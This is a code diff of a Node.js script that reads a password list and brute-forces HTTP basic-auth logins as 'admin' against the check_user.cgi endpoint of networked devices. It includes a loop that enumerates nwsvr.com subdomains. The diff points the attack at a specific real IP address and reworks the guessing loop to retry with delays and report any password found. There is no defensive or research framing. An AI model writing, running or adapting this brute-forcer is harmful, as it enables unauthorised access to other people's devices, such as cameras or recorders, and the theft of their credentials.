@@ -38,14 +38,14 @@ var s = fs.createReadStream('./passwords.txt')
 	.on('end', function(){
 		console.log('Read file end, start spider');
 		//startSpider();
-		login('test','http://61.238.40.187');
+		login('119.246.149.245','http://119.246.149.245');
 	})
 );
 
 
 function startSpider() {
 	for(a=116 ; a<117 ; a++) {
-		for(b=97 ; b<123 ; b++) {
+		for(b=97 ; b<97 ; b++) {
 			for(c=97 ; c<123 ; c++) {
 				for(d=97 ; d<123 ; d++) {
 					var url = 'http://002' + String.fromCharCode(a,b,c,d) + '.nwsvr.com';
@@ -92,31 +92,50 @@ function checkCountry(url,link) {
 function login(url,link) {
 	finish = false;
 	pwInd = 0;
-	do {
-		pw = pwArray[pwInd];
-		tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';
-		console.log(tmpLink);
-		function login2(url2,link2,pw2) {
-			request({url: link2}, function (error, response, body) {
+	//do {
+		function login2() {
+
+			pw = pwArray[pwInd];
+			tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';
+
+			//console.log(tmpLink);
+			request({url: tmpLink}, function (error, response, body) {
 				if (!error && response.statusCode == 200) {
-					console.log(url2 + " pw : " + pw2);
+					console.log(url + " password found : " + pw);
 					finish = true;
 				} else if(!error && response.statusCode == 401) {
-					console.log(url2 + " incorrect pw : " + pw2);
+					//console.log(url + " incorrect pw : " + pw);
+
+					sleep.usleep(10000);
+					
+					pwInd++;
+
+					try {
+					login2();
+					} catch(e) {}
 				} else {
-					console.log(error);
+					//console.log('Error : '+error + ' link : ' + link);
+					try{
 					if(error.indexOf("Invalid URL") == -1) {
-						finish = true;
 					}
+					} catch(e) {}
+
+                    sleep.usleep(10000);
+
+					try{
+                    login2();
+					} catch(e) {}
+
 				}		
 			});
 		}		
 		try {
-		login2(url,tmpLink,pw);
+		login2();
 		} catch(e) {}
 
-		sleep.usleep(10000);	
-		pwInd++;
-	} while((!finish) && (pwInd < pwArray.length))
+
+		//sleep.usleep(10000);	
+		//pwInd++;
+	//} while((!finish) && (pwInd < pwArray.length))
 }
 
